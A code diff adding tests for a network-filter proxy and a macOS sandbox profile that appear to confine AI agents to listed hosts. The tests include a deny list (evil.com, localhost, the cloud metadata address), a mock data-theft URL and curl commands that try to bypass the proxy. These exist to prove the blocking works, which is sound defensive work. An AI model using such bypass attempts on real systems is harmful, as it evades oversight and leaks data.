@@ -168,3 +168,70 @@ test("a whole run, for real: the agent works, cannot take the keys (directly or 
     assert.ok(log.includes("approved") && log.includes("denied"));
   } finally { await sa.close(); }
 });
+
+// ---- the network filter (core/src/netfilter.ts)
+import net from "node:net";
+import http from "node:http";
+import { startNetFilter, hostAllowed, checkHost, proxyEnv, DEFAULT_HOSTS } from "../src/netfilter.ts";
+import { macProfile } from "../src/agent-platform.ts";
+
+test("network filter: only listed sites; addresses and this computer are never a destination", async () => {
+  const allow = [...DEFAULT_HOSTS, ".ejemplo.es"];
+  for (const ok of ["api.anthropic.com", "registry.npmjs.org", "ejemplo.es", "api.ejemplo.es", "API.Anthropic.com"]) assert.ok(hostAllowed(ok, allow), ok);
+  for (const no of ["evil.com", "anthropic.com.evil.com", "notanthropic.com", "xapi.anthropic.com", "localhost", "127.0.0.1", "10.0.0.1", "::1", "[::1]", "169.254.169.254", "miequipo.local", "", "a b"]) assert.ok(!hostAllowed(no, allow), no);
+  assert.equal(checkHost(" .Interno.Ejemplo.es "), ".interno.ejemplo.es");
+  for (const bad of ["192.168.1.1", "localhost", "con espacios.es", "https://x.es", ""]) assert.throws(() => checkHost(bad), /not a host name/, bad);
+  assert.equal(proxyEnv(1234).HTTPS_PROXY, "http://127.0.0.1:1234"); assert.equal(proxyEnv(1234).NO_PROXY, "127.0.0.1,localhost,::1");
+
+  // a real proxy; "permitido.es" really lands on a local test server
+  const origin = http.createServer((req, res) => { res.end("hola desde " + req.headers.host); });
+  await new Promise<void>((r) => origin.listen(0, "127.0.0.1", r));
+  const oport = (origin.address() as { port: number }).port;
+  const told: string[] = [];
+  const f = await startNetFilter({ allow: ["permitido.es"], onBlocked: (h) => told.push(h), dial: () => net.connect(oport, "127.0.0.1") });
+  const connect = (target: string) => new Promise<string>((res) => {
+    const s = net.connect(f.port, "127.0.0.1"); let buf = "";
+    s.on("data", (d) => { buf += d; if (/\r\n\r\n/.test(buf) && !buf.startsWith("HTTP/1.1 200")) { s.destroy(); res(buf); } else if (buf.includes("hola desde")) { s.destroy(); res(buf); } });
+    s.on("connect", () => s.write(`CONNECT ${target} HTTP/1.1\r\nHost: ${target}\r\n\r\n`));
+    s.on("close", () => res(buf));
+    setTimeout(() => { if (buf.startsWith("HTTP/1.1 200") && !buf.includes("GET-SENT")) { buf += "GET-SENT"; s.write("GET / HTTP/1.1\r\nHost: permitido.es\r\nConnection: close\r\n\r\n"); } }, 60);
+  });
+  try {
+    assert.match(await connect("permitido.es:443"), /200 Connection Established[\s\S]*hola desde permitido\.es/);
+    for (const t of ["evil.com:443", "127.0.0.1:22", "localhost:7777", "permitido.es:22", "169.254.169.254:80", `127.0.0.1:${oport}`]) assert.match(await connect(t), /^HTTP\/1\.1 403/, t);
+    // plain HTTP through the proxy
+    const viaProxy = (url: string) => new Promise<{ status: number; body: string }>((res) => { http.get({ host: "127.0.0.1", port: f.port, path: url, headers: { host: new URL(url).host } }, (r) => { let b = ""; r.on("data", (d) => { b += d; }); r.on("end", () => res({ status: r.statusCode!, body: b })); }); });
+    assert.deepEqual(await viaProxy("http://permitido.es/"), { status: 200, body: "hola desde permitido.es" });
+    assert.equal((await viaProxy("http://evil.com/robo?datos=1")).status, 403);
+    assert.equal((await viaProxy(`http://127.0.0.1:${oport}/`)).status, 403);
+    assert.ok(f.blocked.get("evil.com")! >= 2 && f.allowed.get("permitido.es")! >= 2);
+    assert.deepEqual(told.filter((h) => h === "evil.com"), ["evil.com"], "told once per site");
+  } finally { await f.close(); origin.closeAllConnections(); origin.close(); }
+});
+
+test("macOS profile, filtered: no direct way out and no name lookups; a command the person approved keeps the network", () => {
+  const home = tmp(); fs.mkdirSync(path.join(home, "p"));
+  const base = { home, agentHome: path.join(home, "a"), folder: path.join(home, "p"), read: [], write: [], tools: [] };
+  const filtered = macProfile({ ...base, filtered: true });
+  assert.ok(filtered.includes('(deny network-outbound)\n(allow network-outbound (remote ip "localhost:*"))') && !filtered.includes("mDNSResponder"));
+  assert.ok(macProfile(base).includes("mDNSResponder") && !macProfile(base).includes("(deny network-outbound)\n"));
+});
+
+test("macOS, enforced: with the filter on, a program cannot reach the internet directly, only through NEXUS's list", { skip: process.platform !== "darwin" }, async () => {
+  const { home, project } = fakeHome();
+  const sa = await createStandalone({ cliPath: CLI, home, approver: async () => false, watch: false, allowHosts: ["example.org"] });
+  try {
+    assert.ok(sa.net && sa.net.enforced && sa.net.hosts.includes("example.org"));
+    const a = sa.ensureAgent(project), r = sa.agents.startRun(a.id, { program: "probe" });
+    const env = agentEnv(sa.home, sa.platform.tools, r.home, r.env, sa.net!.env);
+    const run = (script: string) => new Promise<number | null>((res) => { const c = spawn(r.argv[0], [...r.argv.slice(1), "/bin/sh", "-c", script], { cwd: project, env, stdio: "ignore" }); c.on("close", res); });
+    assert.notEqual(await run(`curl -s -m 5 --noproxy '*' -o /dev/null https://1.1.1.1/`), 0, "straight out by address");
+    assert.notEqual(await run(`curl -s -m 5 --noproxy '*' -o /dev/null https://example.com/`), 0, "straight out by name (no lookups either)");
+    assert.notEqual(await run(`curl -s -m 6 -f -o /dev/null https://evil-nexus-test.example.com/`), 0, "through the filter, not on the list");
+    assert.ok(sa.net!.blocked.has("evil-nexus-test.example.com"));
+    // the commands NEXUS runs for the agent are filtered the same way
+    const out = await (async () => { const v = sa.platform.command(`curl -s -m 5 --noproxy '*' -o /dev/null https://1.1.1.1/ && echo SALIO || echo cerrado`, project, project, false); const c = spawn(v[0], v.slice(1), { env: sa.platform.env!(), stdio: ["ignore", "pipe", "ignore"] }); let o = ""; c.stdout.on("data", (d) => { o += d; }); await new Promise((res) => c.on("close", res)); return o; })();
+    assert.match(out, /cerrado/);
+    sa.agents.endRun(r.run, 0);
+  } finally { await sa.close(); }
+});
